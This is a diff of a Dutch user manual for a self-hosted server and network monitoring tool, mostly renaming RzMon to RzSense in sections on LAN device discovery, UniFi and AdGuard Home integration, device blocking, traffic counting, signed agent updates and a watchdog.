+  - **GitHub-token**: optioneel. Zonder token zoekt RzSense er 6 per minuut, met token 20. Maak een *fine-grained token* zonder rechten (alleen publieke repositories).
+  - **Mastodon**: zonder token telt RzSense de hashtag (bijvoorbeeld `#CVE20243094`) op de instantie die je kiest (standaard infosec.exchange). Met een token (alleen lezen) telt hij ook berichten zonder hashtag.
   - **Exploit-DB** en **Nuclei**: één keer per dag de lijst, aan of uit.
 - Naar buiten gaat alleen het CVE-nummer. Nodig: uitgaand HTTPS naar `api.github.com`, `hn.algolia.com`, `raw.githubusercontent.com`, `gitlab.com` en je Mastodon-instantie.
 
-**🤖 Raakt dit jou echt?** Met AI-advies aan staat deze knop in de popup. De AI krijgt de gegevens van de CVE (CVSS, EPSS, KEV, SSVC, rugbaarheid) en per server het pakket, de versie, de oplossing en of het pakket op het netwerk luistert. Hij antwoordt met een oordeel (**eerst doen**, **kan wachten** of **niet van toepassing**), waarom, per server, wat je moet doen en wat je kunt doen als bijwerken nu niet kan. Het oordeel staat daarna als 🤖 bij de CVE in de lijst. Het is alleen tekst: RzMon voert niets uit wat de AI voorstelt. Met *Gegevens maskeren* aan gaan servernamen en IP-adressen gemaskeerd naar een cloud-AI.
+**🤖 Raakt dit jou echt?** Met AI-advies aan staat deze knop in de popup. De AI krijgt de gegevens van de CVE (CVSS, EPSS, KEV, SSVC, rugbaarheid) en per server het pakket, de versie, de oplossing en of het pakket op het netwerk luistert. Hij antwoordt met een oordeel (**eerst doen**, **kan wachten** of **niet van toepassing**), waarom, per server, wat je moet doen en wat je kunt doen als bijwerken nu niet kan. Het oordeel staat daarna als 🤖 bij de CVE in de lijst. Het is alleen tekst: RzSense voert niets uit wat de AI voorstelt. Met *Gegevens maskeren* aan gaan servernamen en IP-adressen gemaskeerd naar een cloud-AI.
 
 **🎯 Eén update, veel opgelost** staat bovenaan *Kwetsbaarheden*: de updates die het meeste risico wegnemen. Per pakket zie je naar welke versie, hoeveel kwetsbaarheden het oplost, op hoeveel servers, en of er actief misbruikte of veelbesproken bij zijn. Met **⬆ Bijwerken** werk je één server meteen bij; staat het pakket op meer servers, dan kies je eerst de server.
 
 ### 8.14 Netwerkscan: wat zit er op je netwerk? 🔎 (vanaf 1.103.0)
-RzMon zoekt zelf welke apparaten er op je **lokale netwerken** zitten: telefoons, laptops, camera's, printers, slimme stekkers, je NAS. Je ziet ze op het tabblad **Netwerk**.
+RzSense zoekt zelf welke apparaten er op je **lokale netwerken** zitten: telefoons, laptops, camera's, printers, slimme stekkers, je NAS. Je ziet ze op het tabblad **Netwerk**.
 
 **Aanzetten:** *Instellingen → Beveiliging → Netwerkscan* (standaard uit).
-- **Welke netwerken:** de netwerken bij *Toegang → Lokale netwerken*, bv. `192.168.2.0/24`. Losse adressen (zoals `127.0.0.1`), IPv6, netwerken die geen privé-adressen zijn en netwerken groter dan /22 (1024 adressen) slaat RzMon over; de kaart laat zien wat wel en niet gescand wordt. Internet wordt nooit gescand.
-- **Snelle ronde** (standaard elk uur): een ping naar elk adres, daarna de ARP-tabel van de RzMon-server. Zo vindt RzMon ook apparaten die niet op ping antwoorden. Nieuwe apparaten krijgen hun DNS-naam (via je DNS-server, bv. AdGuard Home).
-- **Diepere scan** (standaard 4× per dag): open poorten (een vaste lijst van ruim 40 bekende poorten), de NetBIOS-naam (Windows, NAS), UPnP (merk en model van tv's, mediaspelers, routers), mDNS/Bonjour (als `avahi-browse` op de RzMon-server staat) en de titel van de webpagina. Daaruit maakt RzMon een gok wat voor apparaat het is.
+- **Welke netwerken:** de netwerken bij *Toegang → Lokale netwerken*, bv. `192.168.2.0/24`. Losse adressen (zoals `127.0.0.1`), IPv6, netwerken die geen privé-adressen zijn en netwerken groter dan /22 (1024 adressen) slaat RzSense over; de kaart laat zien wat wel en niet gescand wordt. Internet wordt nooit gescand.
+- **Snelle ronde** (standaard elk uur): een ping naar elk adres, daarna de ARP-tabel van de RzSense-server. Zo vindt RzSense ook apparaten die niet op ping antwoorden. Nieuwe apparaten krijgen hun DNS-naam (via je DNS-server, bv. AdGuard Home).
+- **Diepere scan** (standaard 4× per dag): open poorten (een vaste lijst van ruim 40 bekende poorten), de NetBIOS-naam (Windows, NAS), UPnP (merk en model van tv's, mediaspelers, routers), mDNS/Bonjour (als `avahi-browse` op de RzSense-server staat) en de titel van de webpagina. Daaruit maakt RzSense een gok wat voor apparaat het is.
 - **Fabrikant:** uit het MAC-adres, met de lijst van Wireshark (maandelijks bijgewerkt).
-- **Sneller en beter:** installeer op de RzMon-server `fping` en `avahi-tools` (Rocky) of `avahi-utils` (Debian). Nodig zijn ze niet.
+- **Sneller en beter:** installeer op de RzSense-server `fping` en `avahi-tools` (Rocky) of `avahi-utils` (Debian). Nodig zijn ze niet.
 
 **Het tabblad Netwerk**
-- **Tellers:** 🆕 nieuw (nog niet beoordeeld), ⚠️ riskante poort, ➕ niet in RzMon en ✔ in RzMon. Klik erop om te filteren.
-- **Kerncijfers:** apparaten (gezien in de laatste 24 uur / totaal), nieuw, niet in RzMon, riskante poorten en welke netwerken gescand worden.
+- **Tellers:** 🆕 nieuw (nog niet beoordeeld), ⚠️ riskante poort, ➕ niet in RzSense en ✔ in RzSense. Klik erop om te filteren.
+- **Kerncijfers:** apparaten (gezien in de laatste 24 uur / totaal), nieuw, niet in RzSense, riskante poorten en welke netwerken gescand worden.
 - **Per apparaat:** icoon en soort, naam, IP-adres, MAC-adres en fabrikant, open poorten (riskante in rood), wanneer gezien en sinds wanneer. **🎭 privé** betekent een willekeurig MAC-adres: telefoons en laptops gebruiken per wifi-netwerk zo'n adres, en soms wisselt het.
-- **Knoppen:** **＋ RzMon** (opent *Server toevoegen* met naam, adres en soort al ingevuld), **✔ Bekend** en **🙈 Negeren**. Met **✔ Alle nieuwe bekend** keur je in één keer alles goed, handig na de eerste scan.
+- **Knoppen:** **＋ RzSense** (opent *Server toevoegen* met naam, adres en soort al ingevuld), **✔ Bekend** en **🙈 Negeren**. Met **✔ Alle nieuwe bekend** keur je in één keer alles goed, handig na de eerste scan.
 - **Klik op een apparaat** voor alle details (DNS-naam, NetBIOS, mDNS, UPnP, webpagina, eerdere IP-adressen) en om een **eigen naam**, de **soort**, een **notitie** of de **status** te zetten. **Vergeten** haalt het apparaat weg; is het er nog, dan komt het bij de volgende scan terug als nieuw.
 - **🔍 Nu scannen** doet meteen een snelle en een diepere ronde.
 
@@ -3150,10 +3152,10 @@ RzMon zoekt zelf welke apparaten er op je **lokale netwerken** zitten: telefoons
 
 **📡 UniFi en AdGuard Home** (vanaf 1.104.0; *Instellingen → Koppelingen → UniFi en AdGuard Home*)
 - **UniFi** (de Network-app, ook versie 9 en 10, op een UniFi OS-console zoals een UDM/UCG/Cloud Key, of zelf gehost):
-  - vul het **adres van de controller** in (bv. `https://192.168.2.1`), de site (meestal `default`) en een **lokaal account** voor RzMon: *Admins & Users → Add admin → Restrict to local access only*, met beheerrechten voor Network en zonder 2FA;
-  - alleen lezen kan ook met een **API-sleutel** (*Settings → Control Plane → Integrations*), maar dan kan RzMon niet weren;
-  - RzMon haalt elke ronde de clientlijst op: de **naam** die je in UniFi gaf, het **wifi-netwerk** (SSID), het **access point** en of het apparaat bedraad is. Een telefoon die slaapt en niet op ping antwoordt, staat er via UniFi toch in.
-- **AdGuard Home:** vul **alle** adressen in (één per regel, bv. de instanties op RL02 en RL03), met gebruikersnaam en wachtwoord. RzMon gebruikt:
+  - vul het **adres van de controller** in (bv. `https://192.168.2.1`), de site (meestal `default`) en een **lokaal account** voor RzSense: *Admins & Users → Add admin → Restrict to local access only*, met beheerrechten voor Network en zonder 2FA;
+  - alleen lezen kan ook met een **API-sleutel** (*Settings → Control Plane → Integrations*), maar dan kan RzSense niet weren;
+  - RzSense haalt elke ronde de clientlijst op: de **naam** die je in UniFi gaf, het **wifi-netwerk** (SSID), het **access point** en of het apparaat bedraad is. Een telefoon die slaapt en niet op ping antwoordt, staat er via UniFi toch in.
+- **AdGuard Home:** vul **alle** adressen in (één per regel, bv. de instanties op RL02 en RL03), met gebruikersnaam en wachtwoord. RzSense gebruikt:
   - de **namen** van je clients (eigen clients en wat AdGuard zelf vond);
   - **🌐 met welke domeinen een apparaat praat**: klap het in het venster van een apparaat open. Je ziet de meest opgevraagde domeinen (uit de query-log van alle instanties samen), hoe vaak en welke geblokkeerd werden (⛔). Handig om te zien of een slim apparaat "naar huis belt".
 - **🧪 Verbinding testen** laat per koppeling zien of het werkt, hoeveel clients UniFi kent en of weren kan.
@@ -3161,32 +3163,32 @@ RzMon zoekt zelf welke apparaten er op je **lokale netwerken** zitten: telefoons
 **⛔ Weren** (vanaf 1.104.0, beheerders): in het venster van een apparaat. Je kiest waarmee, en hoe lang (1 dag, 7 dagen of tot je het weer toelaat), en bevestigt met je wachtwoord.
 - **📶 UniFi:** het apparaat komt niet meer op je **wifi** (blokkeren op MAC-adres). Een bedraad apparaat haal je zo niet van het netwerk; zet daarvoor de poort op de switch uit.
 - **🌐 AdGuard:** het IP-adres komt op de lijst *Niet toegestane clients* van **alle** AdGuard-instanties: geen DNS meer, dus geen internet via namen.
-- **🛡️ RzMon en je servers:** geen toegang meer tot RzMon, en een blokkade op al je servers met agent (als het IDS op *blokkeren* staat; anders alleen vastgelegd).
-- **Nooit te weren:** het apparaat waarmee je nu werkt, de RzMon-server, je router, de UniFi-controller en de AdGuard-servers, servers die in RzMon staan, en adressen op de whitelist.
-- **✅ Weer toelaten** draait alles terug. Is de tijd om, dan doet RzMon dat vanzelf. Elk weren en toelaten geeft een ℹ️-melding (rij *IP geblokkeerd / Blokkade opgeheven* bij Systeeminfo) en komt in het logboek.
+- **🛡️ RzSense en je servers:** geen toegang meer tot RzSense, en een blokkade op al je servers met agent (als het IDS op *blokkeren* staat; anders alleen vastgelegd).
+- **Nooit te weren:** het apparaat waarmee je nu werkt, de RzSense-server, je router, de UniFi-controller en de AdGuard-servers, servers die in RzSense staan, en adressen op de whitelist.
+- **✅ Weer toelaten** draait alles terug. Is de tijd om, dan doet RzSense dat vanzelf. Elk weren en toelaten geeft een ℹ️-melding (rij *IP geblokkeerd / Blokkade opgeheven* bij Systeeminfo) en komt in het logboek.
 - **Let op:** een telefoon met een **privé-adres** kan een nieuw MAC-adres nemen en zo weer op het wifi komen. Een apparaat met een eigen DNS-server of een vast IP-adres komt langs AdGuard.
 
 **Goed om te weten**
 - In *Hoe staat het ervoor?* staat hoeveel apparaten nog niet beoordeeld zijn; het tabblad Netwerk krijgt een oranje teller.
 - Apparaten die 90 dagen niet gezien zijn, verdwijnen, behalve bekende apparaten met een eigen naam.
-- Een UniFi IPS of een strenge firewall kan de scan van RzMon als poortscan zien. Sta in dat geval het IP-adres van de RzMon-server toe.
-- Andere VLAN's: daar ziet RzMon alleen IP-adressen (geen MAC-adres of fabrikant), omdat ARP niet over een router gaat.
+- Een UniFi IPS of een strenge firewall kan de scan van RzSense als poortscan zien. Sta in dat geval het IP-adres van de RzSense-server toe.
+- Andere VLAN's: daar ziet RzSense alleen IP-adressen (geen MAC-adres of fabrikant), omdat ARP niet over een router gaat.
 
 **🗺️ Netwerk → Overzicht** (vanaf 1.184.0)
 
-Netwerk heeft drie tabbladen: **🗺️ Overzicht**, **📋 Apparaten** en **🔍 Ontdekken**. RzMon onthoudt (per browser) welk tabblad je laatst open had; de eerste keer is dat Overzicht.
+Netwerk heeft drie tabbladen: **🗺️ Overzicht**, **📋 Apparaten** en **🔍 Ontdekken**. RzSense onthoudt (per browser) welk tabblad je laatst open had; de eerste keer is dat Overzicht.
 - **Wat zit er op je netwerk**: een teller per soort apparaat, met hoeveel er de laatste 24 uur online waren. Klik op een soort: op de kaart licht die soort op en wordt de rest lichter.
 - **Per netwerk**: per gescand netwerk een balk met hoeveel apparaten online zijn. Apparaten buiten die netwerken staan onder *Andere netwerken*.
-- **De kaart**: bovenaan het internet en je **router** (de standaardgateway van de RzMon-server). Daaronder je **switches** en **access points**, elk met de apparaten die eraan hangen en hoeveel er online zijn; bij een access point ook de wifi-netwerken.
-  - Elk apparaat is een bolletje: **groen** = online, **grijs** = 24 uur niet gezien, **blauwe stip** = nieuw (nog niet beoordeeld), **rode stip** = riskante poort open, **groene ring** = staat in RzMon. Ga erop staan voor naam, IP en fabrikant; klik voor alle details.
+- **De kaart**: bovenaan het internet en je **router** (de standaardgateway van de RzSense-server). Daaronder je **switches** en **access points**, elk met de apparaten die eraan hangen en hoeveel er online zijn; bij een access point ook de wifi-netwerken.
+  - Elk apparaat is een bolletje: **groen** = online, **grijs** = 24 uur niet gezien, **blauwe stip** = nieuw (nog niet beoordeeld), **rode stip** = riskante poort open, **groene ring** = staat in RzSense. Ga erop staan voor naam, IP en fabrikant; klik voor alle details.
   - Aan welk access point of welke switch een apparaat hangt, komt uit **UniFi** (*Instellingen → Koppelingen → UniFi en AdGuard Home*). Bedrade apparaten waarvan de switch niet bekend is, staan onder *Bedraad*; wat UniFi niet kent, onder *Verbinding onbekend*. Zonder UniFi staat alles in één blok onder je router.
   - Een switch of access point die zelf ook een apparaat in de scan is, krijgt zijn naam en IP-adres uit de scan; klik erop voor de details.
 
 **📊 Verkeer per apparaat** (vanaf 1.186.0)
 
-Met UniFi ziet RzMon hoeveel elk apparaat downloadt en uploadt.
+Met UniFi ziet RzSense hoeveel elk apparaat downloadt en uploadt.
 - **Aanzetten:** *Instellingen → Beveiliging → Netwerkscan → Verkeer per apparaat bijhouden* (standaard aan). Nodig: de netwerkscan aan, en UniFi gekoppeld met een **lokaal account** (*Koppelingen → UniFi en AdGuard Home*). Met alleen een API-sleutel geeft UniFi geen tellers.
-- **Hoe het werkt:** elke 5 minuten vraagt RzMon de bytetellers van alle verbonden clients op (`stat/sta`). Het verschil met de vorige keer gaat per uur (30 dagen bewaard) en per dag (een jaar) in de database. Verbindt een apparaat opnieuw, dan begint zijn teller bij nul; RzMon telt dan vanaf nul verder en ziet het niet als negatief verkeer. Een onmogelijk grote sprong (meer dan 10 Gbit/s) wordt genegeerd.
+- **Hoe het werkt:** elke 5 minuten vraagt RzSense de bytetellers van alle verbonden clients op (`stat/sta`). Het verschil met de vorige keer gaat per uur (30 dagen bewaard) en per dag (een jaar) in de database. Verbindt een apparaat opnieuw, dan begint zijn teller bij nul; RzSense telt dan vanaf nul verder en ziet het niet als negatief verkeer. Een onmogelijk grote sprong (meer dan 10 Gbit/s) wordt genegeerd.
 - **Download en upload** zijn gezien vanaf het apparaat: download = wat het ontvangt, upload = wat het verstuurt. Telt jouw controller het andersom (bijvoorbeeld een camera die ineens veel *download*), zet dan *Download en upload omdraaien* aan.
 - **Waar je het ziet:**
   - *Netwerk → Overzicht → Verkeer vandaag*: het totaal van vandaag met de vergelijking met gisteren (tot hetzelfde uur), en een top 10 van de laatste 24 uur. Op de kaart staat onder elk apparaat het verkeer van 24 uur; meer dan 1 GB = een blauwe ring.
@@ -3196,22 +3198,22 @@ Met UniFi ziet RzMon hoeveel elk apparaat downloadt en uploadt.
 - **Ongewoon verkeer** (in *Ontdekken → Veranderingen*, elke nacht over de dag ervoor, na minstens 7 dagen gegevens):
   - **📈 Ongewoon veel verkeer**: op een dag minstens 5× zoveel upload of download als normaal, en minstens 300 MB;
   - **🌙 Verkeer 's nachts**: minstens 50 MB tussen 0 en 6 uur, terwijl het apparaat 's nachts normaal (bijna) stil is.
-- **Goed om te weten:** RzMon telt wat UniFi ziet. Verkeer tussen twee apparaten op dezelfde switch telt UniFi maar voor een deel; het verkeer naar internet klopt het best.
+- **Goed om te weten:** RzSense telt wat UniFi ziet. Verkeer tussen twee apparaten op dezelfde switch telt UniFi maar voor een deel; het verkeer naar internet klopt het best.
 
 **Verkeer zonder UniFi** (vanaf 1.188.0)
 
-Heb je geen UniFi, of ziet UniFi een apparaat niet, dan kan RzMon het verkeer op twee andere manieren tellen:
-- **SNMP op een switch:** zet bij de switch in RzMon SNMP aan (✎ Bewerken, of de algemene SNMP-instelling bij *Koppelingen*), met als soort apparaat *switch*, *router*, *access point* of *firewall*. Elke 5 minuten leest RzMon de tabel met MAC-adressen per poort (BRIDGE-MIB en Q-BRIDGE-MIB) en de bytetellers van de poorten (IF-MIB, 64-bit). Zit er op een poort precies één apparaat, dan is het verkeer van die poort het verkeer van dat apparaat: wat de poort ontvangt is de upload van het apparaat, wat de poort verstuurt de download. Poorten met meer apparaten (uplinks, een switch erachter) tellen niet mee. Het apparaat moet in de netwerkscan staan (met MAC-adres).
-- **De agent op een server** (agent 1.80.0 of nieuwer): de agent stuurt de tellers van zijn echte netwerkkaarten mee (de kaarten met een apparaat erachter, plus bond en wifi; virtuele kaarten zoals docker0, veth of bridges niet). RzMon koppelt dat aan het apparaat in de netwerkscan met het adres van de server (of een van de agent-IP's).
-- **Voorrang:** UniFi gaat voor, dan SNMP, dan de agent. Een bron met minder voorrang telt alleen als de betere bron het apparaat al 15 minuten niet meer zag. Wisselt de bron, dan telt RzMon pas vanaf de volgende meting verder, zodat er geen sprong ontstaat.
+Heb je geen UniFi, of ziet UniFi een apparaat niet, dan kan RzSense het verkeer op twee andere manieren tellen:
+- **SNMP op een switch:** zet bij de switch in RzSense SNMP aan (✎ Bewerken, of de algemene SNMP-instelling bij *Koppelingen*), met als soort apparaat *switch*, *router*, *access point* of *firewall*. Elke 5 minuten leest RzSense de tabel met MAC-adressen per poort (BRIDGE-MIB en Q-BRIDGE-MIB) en de bytetellers van de poorten (IF-MIB, 64-bit). Zit er op een poort precies één apparaat, dan is het verkeer van die poort het verkeer van dat apparaat: wat de poort ontvangt is de upload van het apparaat, wat de poort verstuurt de download. Poorten met meer apparaten (uplinks, een switch erachter) tellen niet mee. Het apparaat moet in de netwerkscan staan (met MAC-adres).
+- **De agent op een server** (agent 1.80.0 of nieuwer): de agent stuurt de tellers van zijn echte netwerkkaarten mee (de kaarten met een apparaat erachter, plus bond en wifi; virtuele kaarten zoals docker0, veth of bridges niet). RzSense koppelt dat aan het apparaat in de netwerkscan met het adres van de server (of een van de agent-IP's).
+- **Voorrang:** UniFi gaat voor, dan SNMP, dan de agent. Een bron met minder voorrang telt alleen als de betere bron het apparaat al 15 minuten niet meer zag. Wisselt de bron, dan telt RzSense pas vanaf de volgende meting verder, zodat er geen sprong ontstaat.
 - Onder de grafieken en de top 10 staat welke bron het verkeer leverde.
-- Zonder UniFi is er geen *Internetlijn* van de gateway en geen *Diensten (DPI)*; de internetlijn is dan de som van alle apparaten die RzMon telt.
+- Zonder UniFi is er geen *Internetlijn* van de gateway en geen *Diensten (DPI)*; de internetlijn is dan de som van alle apparaten die RzSense telt.
 
 **🌐 Internetlijn, diensten, check en rapport** (vanaf 1.187.0)
-- **Internetlijn deze maand** (*Netwerk → Overzicht*, naast *Verkeer vandaag*): elk uur haalt RzMon het verkeer per dag op van je UniFi-gateway (het dagrapport van de site). Lukt dat niet, dan telt RzMon het verkeer van alle apparaten op; dat staat er dan onder. Je ziet download en upload deze maand, een staafje per dag en wat je aan het eind van de maand waarschijnlijk gebruikt hebt.
+- **Internetlijn deze maand** (*Netwerk → Overzicht*, naast *Verkeer vandaag*): elk uur haalt RzSense het verkeer per dag op van je UniFi-gateway (het dagrapport van de site). Lukt dat niet, dan telt RzSense het verkeer van alle apparaten op; dat staat er dan onder. Je ziet download en upload deze maand, een staafje per dag en wat je aan het eind van de maand waarschijnlijk gebruikt hebt.
 - **Datalimiet:** vul bij *Instellingen → Beveiliging → Netwerkscan* je limiet in GB per maand in (download + upload samen). Er komt een balk bij, met een streepje waar je naar verwachting uitkomt. Bij **80%** en bij **100%** krijg je één keer per maand een ℹ️-melding (*Meldingen → Systeemmeldingen → Datalimiet internet bijna of helemaal op*).
-- **Diensten (UniFi DPI)** in het venster van een apparaat: klap het open voor de verdeling van het verkeer over soorten diensten (streaming, web, updates en beveiliging, sociale media, VPN en tunnels, games …), sinds het apparaat verbonden is. Daarvoor moet in UniFi *Traffic Identification* aan staan. UniFi geeft per soort dienst geen namen van apps door; RzMon laat de soort zien.
-- **Check Verkeer (UniFi):** bij ＋ Check → *Verkeer (UniFi)*. Vul het MAC- of IP-adres van het apparaat in (leeg = het adres van de server, handig als het apparaat zelf in RzMon staat) en kies wat je meet:
+- **Diensten (UniFi DPI)** in het venster van een apparaat: klap het open voor de verdeling van het verkeer over soorten diensten (streaming, web, updates en beveiliging, sociale media, VPN en tunnels, games …), sinds het apparaat verbonden is. Daarvoor moet in UniFi *Traffic Identification* aan staan. UniFi geeft per soort dienst geen namen van apps door; RzSense laat de soort zien.
+- **Check Verkeer (UniFi):** bij ＋ Check → *Verkeer (UniFi)*. Vul het MAC- of IP-adres van het apparaat in (leeg = het adres van de server, handig als het apparaat zelf in RzSense staat) en kies wat je meet:
 
   | Meten | Eenheid | Voorbeeld |
   |---|---|---|
@@ -3237,56 +3239,56 @@ Bij **📋 Apparaten** (de lijst hierboven) staat de keuzelijst om te groeperen;
   | 🔁 Ander IP-adres | hetzelfde MAC-adres kreeg een ander IP-adres |
   | 🚪 Nieuwe poort open | de diepere scan vond een poort die eerder dicht was; ⚠️ bij een riskante poort (Telnet, FTP, VNC …) |
   | 🔒 Poort dicht | een poort die open was, is dicht |
-  | 🌐 Praat met nieuwe domeinen | alleen met AdGuard Home: RzMon leert eerst **7 dagen** met welke hoofddomeinen een apparaat praat (`cdn.voorbeeld.nl` telt als `voorbeeld.nl`), en meldt daarna elk nieuw hoofddomein. Lokale namen (`.local`, `.lan`, `.home`) tellen niet mee |
+  | 🌐 Praat met nieuwe domeinen | alleen met AdGuard Home: RzSense leert eerst **7 dagen** met welke hoofddomeinen een apparaat praat (`cdn.voorbeeld.nl` telt als `voorbeeld.nl`), en meldt daarna elk nieuw hoofddomein. Lokale namen (`.local`, `.lan`, `.home`) tellen niet mee |
   | 💤 Al dagen weg | **3 dagen** niet gezien. Alleen voor apparaten met een vast MAC-adres die je niet negeert; telefoons met een privé-adres wisselen te vaak |
   | 👋 Weer terug | een apparaat dat weg was, is er weer |
 
-- **💡 Voorstellen**: apparaten die nog niet in RzMon staan, die je niet negeert, die de laatste 7 dagen gezien zijn, en die je meestal wilt bewaken: router, switch of access point, server, NAS, printer, camera, smart home, IoT en media. Telefoons en laptops komen hier alleen als ze een dienst aanbieden.
+- **💡 Voorstellen**: apparaten die nog niet in RzSense staan, die je niet negeert, die de laatste 7 dagen gezien zijn, en die je meestal wilt bewaken: router, switch of access point, server, NAS, printer, camera, smart home, IoT en media. Telefoons en laptops komen hier alleen als ze een dienst aanbieden.
   - Per apparaat staan de checks die passen bij de open poorten: **Ping**, **Web** (https gaat voor http; certificaten worden niet gecontroleerd, want apparaten hebben bijna altijd een eigen certificaat), beheerpagina's (5000/5001, Proxmox 8006), **Home Assistant** (8123), **Plex**, en poortchecks voor SSH, DNS, SMB, AFP, **RTSP** (camerabeeld), **IPP** en 9100 (printen), MQTT, MariaDB en PostgreSQL. De eerste drie staan aangevinkt.
-  - **＋ In RzMon met deze checks** (beheerders) zet het apparaat met één klik in RzMon: als server zonder agent, met het IP-adres, de juiste soort en de gekozen checks. In het netwerkoverzicht wordt het apparaat *bekend*. **✎ Zelf instellen** opent het gewone formulier om een server toe te voegen.
+  - **＋ In RzSense met deze checks** (beheerders) zet het apparaat met één klik in RzSense: als server zonder agent, met het IP-adres, de juiste soort en de gekozen checks. In het netwerkoverzicht wordt het apparaat *bekend*. **✎ Zelf instellen** opent het gewone formulier om een server toe te voegen.
   - Bij een router, switch, NAS of printer staat een tip om daarna **SNMP** aan te zetten (poorten, temperatuur en meer).
 - **🕒 Aanwezigheid**: per apparaat een blokje per uur over de laatste 7 dagen (groen = gezien in een scan van dat uur), het percentage van de tijd dat het online was, en 🌙 als het ook 's nachts (0–6 uur) online was. Filter op soort, bijvoorbeeld alleen telefoons. Handig voor Home Assistant (wie is er thuis) en om te zien wat er 's nachts aan staat.
 
-Goed om te weten: RzMon houdt dit bij vanaf 1.183.0, dus na de update is Ontdekken eerst nog leeg. Hoe vaak er gescand wordt, stel je in bij *Instellingen → Beveiliging → Netwerkscan*; met een lichte ronde per uur zie je per uur of een apparaat er was. Veranderingen worden 90 dagen bewaard, de aanwezigheid 30 dagen.
+Goed om te weten: RzSense houdt dit bij vanaf 1.183.0, dus na de update is Ontdekken eerst nog leeg. Hoe vaak er gescand wordt, stel je in bij *Instellingen → Beveiliging → Netwerkscan*; met een lichte ronde per uur zie je per uur of een apparaat er was. Veranderingen worden 90 dagen bewaard, de aanwezigheid 30 dagen.
 
 ### 8.14c Ondertekende updates 🔏 (vanaf 1.139.0, agent 1.71.0)
-Elke nieuwe agent wordt in GitHub **ondertekend** met een geheime sleutel die alleen daar staat (het geheim `AGENT_SIGN_KEY`; de workflow *Agent ondertekenen* zet de handtekeningen `agent/*.sig` erbij). In de agent zelf staat de bijbehorende **publieke sleutel**. Bij bijwerken haalt de agent de nieuwe versie en de handtekeningen bij RzMon op en installeert alleen als ze kloppen. Zo kan ook iemand die RzMon zelf zou overnemen geen eigen code op je servers zetten.
+Elke nieuwe agent wordt in GitHub **ondertekend** met een geheime sleutel die alleen daar staat (het geheim `AGENT_SIGN_KEY`; de workflow *Agent ondertekenen* zet de handtekeningen `agent/*.sig` erbij). In de agent zelf staat de bijbehorende **publieke sleutel**. Bij bijwerken haalt de agent de nieuwe versie en de handtekeningen bij RzSense op en installeert alleen als ze kloppen. Zo kan ook iemand die RzSense zelf zou overnemen geen eigen code op je servers zetten.
 
-- Je werkt gewoon bij zoals altijd (knop in RzMon). In de Agent Manager staat daarna *🔏 Laatste update: handtekening van de ontwikkelaar gecontroleerd*.
+- Je werkt gewoon bij zoals altijd (knop in RzSense). In de Agent Manager staat daarna *🔏 Laatste update: handtekening van de ontwikkelaar gecontroleerd*.
 - Klopt de handtekening niet, dan weigert de agent de update (*✘ Laatste update geweigerd*) en blijft de oude versie werken.
 - Ook het installatiescript (`rzmon-agent-setup`) controleert de handtekening bij installeren en met `--update`.
 - Op een server met OpenSSL ouder dan 3.0 (bv. Debian 11) kan de handtekening niet gecontroleerd worden; dan geldt alleen het controlegetal en staat dat in de Agent Manager.
-- *Instellingen → Status → Agents* laat zien of de agent die RzMon uitlevert ondertekend is.
+- *Instellingen → Status → Agents* laat zien of de agent die RzSense uitlevert ondertekend is.
 - Noodgeval: `UPDATE_UNSIGNED=1` in `/etc/default/rzmon-agent` werkt bij zonder handtekening (niet aangeraden).
 
 ### 8.14b Snel en betrouwbaar rapporteren ⏱ (vanaf 1.137.0, agent 1.69.0)
 Een rapport mag nooit worden opgehouden door één traag onderdeel, en een agent die gewoon bezig is, is niet "stil":
 - **Commando-checks op de achtergrond**: de eerste keer meet de agent meteen; daarna gaat steeds het vorige resultaat mee en meet hij op de achtergrond opnieuw. Het nieuwe resultaat komt met het volgende rapport.
 - **Hartslag**: duurt een run langer dan de tik (een druk systeem, een trage dienst), dan meldt de agent elke tik "ik ben bezig". Dat telt als contact, dus geen *agent stil*; in de Agent Manager staat dan *⏳ bezig sinds …*. Duurt een run langer dan een kwartier, dan telt de hartslag niet meer: dan hangt er iets en komt de melding wel.
-- **Wachtrij**: lukt versturen niet (RzMon herstart, netwerk weg), dan bewaart de agent de metingen van CPU, RAM en disks (hooguit een dag, in `/var/lib/rzmon-agent/keys/queue.jsonl`) en stuurt ze met het volgende rapport mee. RzMon zet ze op hun eigen tijd in de grafieken; de status van nu verandert er niet door, en hetzelfde meetmoment telt maar één keer.
-- **Gecomprimeerd versturen** (vanaf agent 1.73.0 met RzMon 1.147.0): een rapport groter dan 2 kB gaat met gzip, vóór het versleutelen (de handtekening dekt dus ook de gecomprimeerde inhoud). Meestal 50–85% kleiner. De agent doet dat pas als RzMon in zijn antwoord laat weten dat hij het kan; weigert RzMon een gecomprimeerd rapport, dan gaat het volgende weer gewoon. Uitzetten per server: `COMPRESS=0` in `/etc/default/rzmon-agent`. RzMon pakt hooguit 64 MB uit (een "zip-bom" wordt geweigerd). Met `rzmon-agent --status` zie je bij het laatste rapport `gz=1`.
+- **Wachtrij**: lukt versturen niet (RzSense herstart, netwerk weg), dan bewaart de agent de metingen van CPU, RAM en disks (hooguit een dag, in `/var/lib/rzmon-agent/keys/queue.jsonl`) en stuurt ze met het volgende rapport mee. RzSense zet ze op hun eigen tijd in de grafieken; de status van nu verandert er niet door, en hetzelfde meetmoment telt maar één keer.
+- **Gecomprimeerd versturen** (vanaf agent 1.73.0 met RzSense 1.147.0): een rapport groter dan 2 kB gaat met gzip, vóór het versleutelen (de handtekening dekt dus ook de gecomprimeerde inhoud). Meestal 50–85% kleiner. De agent doet dat pas als RzSense in zijn antwoord laat weten dat hij het kan; weigert RzSense een gecomprimeerd rapport, dan gaat het volgende weer gewoon. Uitzetten per server: `COMPRESS=0` in `/etc/default/rzmon-agent`. RzSense pakt hooguit 64 MB uit (een "zip-bom" wordt geweigerd). Met `rzmon-agent --status` zie je bij het laatste rapport `gz=1`.
 - **Wat is traag?** In de Agent Manager staat bij elke server *⏱ Laatste run*: hoe lang de run duurde en de traagste onderdelen. Daaronder staat wat de agent op die server kan (podman, docker, zpool, smartctl, nft …).
 
-Valt RzMon zelf uit, dan krijg je van RzMon niets meer, en denk je dat alles goed is. Daarom kan een agent **RzMon bewaken**: zet in de **Agent Manager** van een server *🐕 Waakhond* aan (bij 1 of 2 servers is genoeg; elke waakhond stuurt zijn eigen bericht) en kies na hoeveel minuten (standaard 5).
-- Lukt het rapport aan RzMon zo lang niet, dan stuurt de agent **zelf** een pushbericht via Pushover en/of ntfy (*⚠️ RzMon onbereikbaar*, met de prioriteit van je critical-meldingen), en een herstelbericht als RzMon terug is.
